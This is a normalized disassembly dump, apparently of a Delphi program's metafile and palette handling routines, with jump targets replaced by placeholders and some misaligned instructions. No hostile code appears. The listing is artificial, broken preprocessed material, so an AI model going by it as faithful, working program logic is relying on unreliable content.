push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_426196
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4167c8
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403e44
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4050a8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42619d
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4261a8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
call sub_4167c8
mov esi eax
mov edx ebp
mov eax [ esi ]
call sub_404190
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ r-xdata ]
mov eax esi
call sub_405f2c
mov edx ebx
mov eax edi
call sub_4166b4
sub_4261f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4167c8
mov edx edi
call sub_404190
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4166b4
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_4166b4
sub_42625c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_42628c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_403e3c
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_4262c0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4040f0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403f64
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_404178
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_404178
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_404160
sub_42633c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_4263cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403f64
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403e3c
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_404178
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_404178
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42641c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_42633c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_42633c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_416dc8
mov edx ebx
mov eax esi
call sub_42633c
jmp r-xdata
pop esi
pop ebx
retn
sub_426478
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_42623c
mov ecx esi
mov edx ebx
call sub_426084
pop esi
pop ebx
pop ebp
retn 0x4
sub_42649c
push ebx
mov ebx edx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4261a8
pop ebx
retn
mov edx ebx
mov eax [ rw-data ]
call sub_4261f4
sub_4264cc
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4264f0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
movzx ebx [ ebp + 0x14 ]
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_42651c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_426622
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
movzx ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_4050a8
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_426118
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403f64
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4265a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426629
lea eax [ ebp - 0x48 ]
call sub_404e44
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_404178
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_404178
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4265a9
mov eax [ ebp - 0x4 ]
call sub_403f64
call sub_404800
call sub_404854
mov eax [ ebx + 0xc ]
call sub_403f64
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426629
lea eax [ ebp - 0x48 ]
call sub_404e44
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_404178
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_404178
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_426630
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403e44
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_403618
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
movzx ecx [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_426688
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_426704
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_42651c
mov eax [ ebp - 0x8 ]
push eax
push sub_426630
push ebp
call sub_426688
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42674d
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4227d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_426790
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_425afc
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4267d8
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_427868
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_426808
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_427868
mov edx esi
mov eax ebx
call sub_416dc8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
movzx eax [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_427864
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_42689c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_42455c
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_42455c
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_42455c
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_42455c
push eax
call SelectPalette
sub_426934
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426adc
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_426998
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4227d0
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_426a24
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426adc
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_426a88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_427008
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4192c0
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_426c40
mov edx esi
mov eax ebx
call sub_426b70
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_426adc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_427868
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_427864
pop esi
pop ebx
retn
sub_426b04
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_427008
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_426c40
mov edx esi
mov eax ebx
call sub_426b70
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_426b70
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_426adc
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_4194ec
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_402d28
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_426c30
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_402f9c
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_4194ec
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424858
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c37
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_402d44
retn
call sub_424858
sub_426c40
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_426adc
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_424858
lea eax [ ebp - 0x22 ]
call sub_4256b8
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_402d28
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_426daf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
movzx edx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424858
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426db6
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_402d44
retn
call sub_424858
sub_426dc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426e69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_426e47
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40a164
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40e95c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425dd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e4e
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_426ea4
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426adc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426f18
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426f18
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_426f18
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_426adc
pop esi
pop ebx
retn
mov eax ebx
call sub_427068
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426f54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_426adc
pop esi
pop ebx
retn
mov eax ebx
call sub_427068
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426f94
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426adc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426f54
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426f54
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_427008
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4192c0
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_427068
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_426adc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_427868
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_427864
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_4270ec
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_4192c0
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4271f8
mov edx ebx
mov eax esi
call sub_42716c
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_42716c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
